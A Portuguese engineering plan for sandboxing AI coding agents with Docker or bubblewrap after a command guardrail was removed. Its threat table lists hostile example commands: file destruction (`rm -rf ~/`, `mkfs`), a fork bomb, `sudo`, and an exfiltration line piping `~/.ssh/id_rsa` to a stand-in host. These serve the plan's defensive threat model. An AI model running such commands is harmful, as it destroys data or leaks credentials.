# Plano: sandbox de execução para os robôs da autoia

> Estado atual: o guardrail de comandos foi **removido** (era pós-emissão — o comando já
> rodava quando a `tool_call` chegava no stream; não impedia o dano e gerava falsos
> positivos). Os robôs rodam hoje como subprocessos do worker com **os privilégios do
> usuário host**, sem isolamento. Este plano substitui o guardrail por um **sandbox de
> execução** (isolamento real de sistema), que é a proteção efetiva.

---

## 0. Checkpoint — estado no momento do plano

Registro do que já foi feito/decidido até a data deste plano (para retomar sem contexto):

- **Guardrail removido** (código): em `backend/app/worker/kimi_exec.py` e
  `backend/app/worker/opencode_exec.py` a avaliação `guardrails.check_tool_call` foi
  removida do loop — comandos como `curl`/`git push`/`sudo` **não matam mais** a
  execução. Permanecem: watchdog de loop (`max_identical_calls`), timeout por fase e
  "sem progresso", e o stop file. `guardrails.py` mantém `GuardrailViolation` e as
  funções de análise, sem enforcement.
- **Prompt**: `backend/app/prompts.py` → `GUARDRAIL_INSTRUCTIONS` agora é orientação
  (sem alegações de "BLOQUEADO"), mantendo as regras operacionais (sem push, sem
  comandos destrutivos). `AGENTS.md` atualizado (guardrail documentado como removido,
  "sandbox ainda a fazer").
- **Testes**: 244 passando. Foram atualizados os que verificavam o bloqueio
  (`test_kimi_exec.py`, `test_opencode_exec.py`, `test_api.py`, `test_timeline.py`).
- **Serviços**: API e worker rodando com o código novo (PIDs em
  `data/.start.pids/`, log em `data/api.out`/`data/worker.out`).
- **Restrições de código novas**: `run_worker` rejeita `--workers > 1`;
  `send_instruction`/`retry_step` recusam rewind/retry enquanto uma fase da task está
  `running` (proteção contra fases paralelas da mesma task).
- **Disco (decisão)**: modelo de **bind mounts compartilhados** (sem cópia). Overhead
  de disco é só a imagem base (~200 MB, uma vez); toolchains, SDK (Android), caches
  de build e estado das CLIs vêm de mounts do host — **não multiplica com N projetos**.
  Alternativa bwrap = 0 MB de imagem (mas rede só via `--unshare-net`).
- **Task 31** (contexto de validação): estava progredindo após remoção do guardrail —
  o avaliador reprovou por um **defeito real** no frontend (`deleteErrorMessage` usa
  `msg.startsWith("403")` mas `String(new Error("403: ..."))` = `"Error: 403: ..."`),
  o developer re-executou e o assess revalidava. Não faz parte deste plano.

---

## 1. Contexto

- Executores: `backend/app/worker/kimi_exec.py` e `backend/app/worker/opencode_exec.py`
  fazem `subprocess.Popen` de `kimi -p --output-format stream-json` /
  `opencode run --format json`, com `cwd` = checkout
  (`data/workspaces/<repo_id>/task_<task_id>`), `start_new_session=True`.
- O worker é síncrono (thread-based), watchdogs de progresso, kill por grupo
  (SIGTERM → SIGKILL) e parada cooperativa por arquivo `.stop-<repo_id>`.
- Ambiente de execução atual (host): Docker 29.7.1 disponível (usuário no grupo
  `docker`), bubblewrap 0.9.0, `unshare`, `systemd-run`. As CLIs vivem no home do
  usuário: `~/.nvm/.../opencode`, `~/.kimi-code/bin/kimi`, com estado em
  `~/.config/opencode`, `~/.local/share/opencode` (1,8 G), `~/.kimi-code` (639 M) e
  `~/.kimi-webbridge`.

## 2. Objetivo e ameaças

**Objetivo**: garantir que NENHUMA ação do agente (ou da CLI) possa danificar o host,
independente de o LLM obedecer ou não o prompt. Falha do sandbox → falha da execução,
nunca dano.

Ameaças a conter (por ordem de severidade):

| Ameaça | Exemplo | Mitigação |
| --- | --- | --- |
| Destruição de arquivos do host | `rm -rf ~/`, `dd`, `mkfs`, `> ~/.bashrc` | FS do host fora do checkout **somente-leitura** ou ausente |
| Escalação/privilégio | `sudo`, `pkexec`, `su -` | `--cap-drop ALL`, `no-new-privileges`, sem root no contêiner |
| Exfiltração de dados | `curl http://evil/... < ~/.ssh/id_rsa` | Rede restrita (allowlist de egress) |
| Consumo de recursos | loop infinito, `:(){ :|:& };:`, `dd if=/dev/zero` | `--pids-limit`, `--memory`, `--cpus`, tmpfs limitado |
| Push/alterar git remoto | `git push origin main` (merge é do worker) | Rede restrita + `remote.*.pushurl` inválido no checkout |
| Reboot/shutdown/kernel | `shutdown`, `reboot` | Sem `CAP_SYS_BOOT`/`CAP_SYS_ADMIN`, sem devices |
| Persistência fora do workspace | gravar em `/etc`, `/home` | Checkout + dirs de estado das CLIs são os únicos pontos rw |

**Fora de escopo agora**: impedir LEITURA de arquivos do host pelo agente (as CLIs
precisam de credenciais/configs; ler `~/.config/opencode` é necessário). A meta é
"não danifica e não exfiltra", não "não vê".

## 3. Escolha do primitivo: Docker (fallback: bwrap)

**Recomendado: contêiner OCI via Docker** — já instalado, o usuário está no grupo
`docker`, e o Docker dá controle real de FS, rede, capabilities e recursos com pouco
código.

**Fallback leve: bubblewrap** (`bwrap`) para as fases de isolamento de arquivos em
ambientes sem Docker — mas bwrap não isola rede externa por allowlist sem trabalho
extra (só `--unshare-net`, que corta tudo).

Decisão de implementação: uma camada de abstração fina
(`exec_common.sandbox.py`) com backend Docker hoje e backend bwrap como opção —
os dois produzem o mesmo "comando sandboxado + redirecionamentos" consumidos pelos
executores.

## 4. Arquitetura-alvo

O executor não spawna mais o binário direto: spawna um wrapper que roda o mesmo
comando **dentro do sandbox**, com o stdout ainda sendo o JSONL consumido pelo worker.

```
antes:  Popen([opencode, "run", prompt, "--format", "json", "--dir", checkout], cwd=checkout)
depois: Popen([docker, "run", ...mounts/limites...,
               "<img>", opencode, "run", prompt, "--format", "json", "--dir", checkout],
              cwd=checkout)
```

### 4.1 Mounts (host → contêiner)

| Caminho host | Caminho no contêiner | Modo | Por quê |
| --- | --- | --- | --- |
| `<checkout>` | **mesmo path absoluto** | rw | gitops do worker opera no host; o executor vê a mesma árvore |
| `data/` (workspace raiz) | mesmo path | rw | `.stop-<id>`, handoff, screenshots, subtasks |
| `~/.config/opencode` | `$HOME/.config/opencode` | ro (ou rw) | credenciais/config das CLIs |
| `~/.local/share/opencode` | `$HOME/.local/share/opencode` | rw | estado/sessões (1,8 G) |
| `~/.kimi-code` | `$HOME/.kimi-code` | rw | binário + sessões + plugins |
| `~/.kimi-webbridge` | `$HOME/.kimi-webbridge` | rw | daemon webbridge |
| `~/.nvm` | `~/.nvm` | ro | runtime node do opencode |
| `/usr`, `/usr/local`, `/lib`, `/lib64`, `/bin`, `/opt`, `/etc/ssl` | idem | **ro** | toolchain do host disponível p/ builds, sem escrita |
| `/tmp` | `/tmp` | tmpfs (limite) | temporários |
| `/proc` | `/proc` | ro | — |

> Imagem do contêiner: base mínima (ex.: `debian`/`ubuntu` slim) apenas com
> shell/coreutils. Todo o resto vem dos mounts ro do host — assim o build de
> qualquer projeto continua funcionando com a toolchain real, sem manter imagens por
> ecossistema. Alternativa (avaliar): imagem com toolchains fixas.

### 4.2 Segurança (flags)

```
--read-only --cap-drop ALL --security-opt no-new-privileges
--pids-limit 256 --memory 4g --cpus 2 --tmpfs /tmp:rw,size=1g,mode=1777
--init                       # reap PID 1 + forward de sinais p/ a CLI
--user 1000:1000             # uid/gid do usuário host (para escrita no checkout)
```

### 4.3 Rede — o problema difícil

Robôs precisam de: (a) serviços de **loopback do host** (autoia API :9000 para smoke
tests, webbridge :10086) e (b) **egress** para registros de pacotes
(dl.google.com, registry.npmjs.org, pypi.org…) e nada além.

- Com `--network=host` os dois funcionam mas o sandbox não isola rede (exfiltração
  fica livre) → **não aceitável para a meta**.
- Modelo-alvo (Fase 2):
  - `--network=bridge` + `--add-host host.docker.internal:host-gateway`.
  - AGENTS.md/prompt orientam as CLIs a usar `http://host.docker.internal:<porta>`
    para os serviços do host (com env `AUTOIA_HOST_SERVICES_BASE`).
  - Egress: **proxy de allowlist** rodando no host (ex.: processo simples Go/Python,
    `HTTP(S)_PROXY=host.docker.internal:PORT` no contêiner) — só encaminha hosts da
    whitelist (mesma `DEFAULT_WHITELISTED_HOSTS` de `config.py`). Sem proxy/fora da
    lista → conexão recusada (fail-closed).
- Curto prazo (Fase 1): `--network=host` aceitável como estágio intermediário, desde
  que a exfiltração seja mitigada no nível do sistema (ex.: remover credenciais
  sensíveis dos mounts ro) — deixar explícito que é temporário.

### 4.4 Sinais e kill

- `--init` (tini) no contêiner: o `SIGTERM` do `kill_group` propaga e o contêiner
  morre com a CLI — necessário para timeout/watchdog/stop file continuarem valendo.
- O processo filho do worker passa a ser o `docker`, então `start_new_session=True`,
  `register_proc(proc, repo_id=...)` e o `kill_group` continuam funcionando intactos.

### 4.5 Checkout remoto e push

- O `remote` do checkout pode ser uma URL real. Além da rede restrita, o worker deve,
  **antes de cada execução**, forçar `git config remote.origin.pushurl` para um
  destino inválido (`/dev/null`/`none://`) e restaurar após — defesa em profundidade
  para o caso mais caro (push do robô).

## 5. Fases de implementação

### Fase 0 — Quick wins (independente do contêiner)
- [ ] Bloquear push no checkout: hook `pre-push` + `pushurl` inválido aplicados pelo
      worker no início de cada execução (`gitops.py`).
- [ ] Limites de recursos básicos por execução já no host: `ulimit -v`, `ulimit -n`,
      `nice`/`ionice` no spawn (`exec_common.py`).
- [ ] Teste: garantir que os robôs continuam sem matar execução por comando "suspeito".

### Fase 1 — Isolamento de arquivos e privilégios (núcleo)
- [ ] `exec_common/sandbox.py`: builder do comando `docker run` (mounts, flags,
      imagem base, mapeamento do binário da CLI) com backend bwrap opcional.
- [ ] `kimi_exec`/`opencode_exec`: trocar o spawn direto pelo sandbox; manter
      `--dir`/`cwd`, stream, watchdogs e log idênticos.
- [ ] Resolver estado das CLIs (mounts ro/rw) e credenciais (ro).
- [ ] Falha do sandbox (docker indisponível) → fallback para execução direta + log de
      aviso, até decisão de "fail-closed" na Fase 3.
- [ ] Critérios: `rm -rf ~/`, `dd`, `sudo`, escrita em `/etc`, `shutdown` **falham**
      dentro do sandbox; build real (pytest/npm) funciona; kill/timeout/stop continuam
      matando.

### Fase 2 — Rede (allowlist de egress)
- [ ] Proxy de allowlist no host (mesma lista de `config.py`) + `HTTP(S)_PROXY` no
      contêiner + `--network bridge`.
- [ ] Serviços do host acessíveis via `host.docker.internal` (prompt/AGENTS.md + env).
- [ ] Critérios: `curl https://registry.npmjs.org` OK; `curl https://evil.example.com`
      **falha**; smoke test da API local (host.docker.internal:9000) OK.

### Fase 3 — Integração no worker e rollout
- [ ] `Settings.sandbox` (modo: `off` | `fs` | `full`, default `off` até validado) e
      propagação no `EffectiveSettings` (`runner.py`).
- [ ] Rollout por repo/task: `Repository.sandbox` override; tasks novas default
      conforme projeto.
- [ ] Testes: rodar a suíte de execução (`fake_kimi`/`fake opencode`) **dentro do
      sandbox** (os fake scripts já estão em `tmp_path`); CI do sandbox.
- [ ] Decisão de fail-closed: sandbox obrigatório (sem fallback silencioso).

### Fase 4 — Hardening e observabilidade
- [ ] Evento `sandbox` por execução (RunEvent: modo, contêiner, custo de overhead).
- [ ] Varredura: nenhum segredo rw além dos dirs de estado; `/root`, `/etc/shadow`,
      chaves SSH fora dos mounts.
- [ ] Métricas: overhead de startup do contêiner, falhas do sandbox.

## 6. Integração no código (pontos exatos)

| Arquivo | Mudança |
| --- | --- |
| `backend/app/config.py` | `sandbox` mode + imagens/limites/proxy (env `AUTOIA_SANDBOX_*`) |
| `backend/app/worker/exec_common.py` | `build_sandbox_command()`, `ulimit` no spawn |
| `backend/app/worker/sandbox.py` | (novo) builder docker/bwrap dos mounts/flags |
| `backend/app/worker/kimi_exec.py` / `opencode_exec.py` | usar `build_sandbox_command()` no `Popen` |
| `backend/app/worker/gitops.py` | `lock_push()`/`unlock_push()` no checkout |
| `backend/app/worker/runner.py` | `EffectiveSettings.sandbox`, chamar lock/unlock push antes/depois |
| `backend/app/prompts.py` + `AGENTS.md` | host services via `host.docker.internal`; notas do sandbox |
| `tests/` | execução dos fakes dentro do sandbox; testes de negação |

## 7. Problemas difíceis (decisões abertas)

1. **Rede**: `host.docker.internal` exige mudar o que os robôs usam como loopback do
   host (hoje hardcoded `127.0.0.1`). Definir env + instrução de prompt; validar
   webbridge (`:10086`) atrás do host-gateway.
2. **Credenciais**: `~/.config/opencode` (ro) contém API keys; o agente pode lê-las.
   Aceitar por ora (meta é não exfiltra), revisar com segredo injetado via env ro em
   fase posterior.
3. **Estado das CLIs**: `~/.local/share/opencode` (1,8 G) rw dentro do contêiner —
   crescimento/duplicação; avaliar volume nomeado único por host (não por task).
4. **Toolchains dos projetos**: mounts ro do host resolvem sem imagem por projeto;
   validar projetos que esperam escrever em cache do build (npm `~/.npm`,
   pip `~/.cache`) → apontar cache para tmpfs/volume.
5. **Overhead**: startup do `docker run` (~0,2–1 s) por execução; medir impacto nos
   ciclos curtos (summary).
6. **nvm/opencode**: binário vem de `~/.nvm` (symlink) — montar `~/.nvm` ro e PATH
   ajustado no contêiner.

## 8. Critérios de aceite (testáveis)

- [ ] Comando destrutivo dentro do sandbox **falha** sem efeito no host (teste real:
      `rm -rf /tmp/sandbox-host-marker` não existe no host).
- [ ] `git push origin main` no checkout do sandbox **não** publica nada (rede +
      pushurl).
- [ ] `curl https://registry.npmjs.org` OK; `curl https://evil.example.com` falha.
- [ ] Smoke test da autoia local a partir do sandbox funciona (host.docker.internal).
- [ ] `pytest` e `npm run build` do próprio autoia rodam dentro do sandbox.
- [ ] Watchdog de loop/timeout/sem-progresso e o stop file continuam matando a
      execução do contêiner.
- [ ] Suíte completa (`pytest`) verde com os fakes rodando sandboxed.
- [ ] Overhead médio por execução medido e documentado.

## 9. Riscos e fallbacks

| Risco | Mitigação |
| --- | --- |
| Docker indisponível/sem permissão | backend bwrap (FS); aviso; decisão fail-closed na Fase 3 |
| Robô precisa de serviço do host fora da lista | `host.docker.internal` documentado; whitelist por projeto |
| Ferramenta do projeto precisa de rede externa nova | ampliar whitelist (config por repo) |
| CLIs quebram com home restrito | testar opencode/kimi reais sandboxed em ambiente de QA antes de ligar default |
| Overhead/custo | flag `off` por task; medir; tmpfs e volumes reaproveitados |

## 10. Checklist final

- [ ] Nenhuma execução de robô roda fora do sandbox (quando `full`).
- [ ] FS do host: checkout + estado das CLIs são os únicos pontos rw.
- [ ] Sem capabilities privilegiadas; sem root; sem devices.
- [ ] Rede: loopback do host via host-gateway; egress só via proxy allowlist.
- [ ] Push real bloqueado (rede + pushurl).
- [ ] Kill/timeout/stop file funcionam no contêiner (`--init`).
- [ ] Fakes da suíte rodam sandboxed; suíte verde.
- [ ] Overhead documentado; métricas por execução.
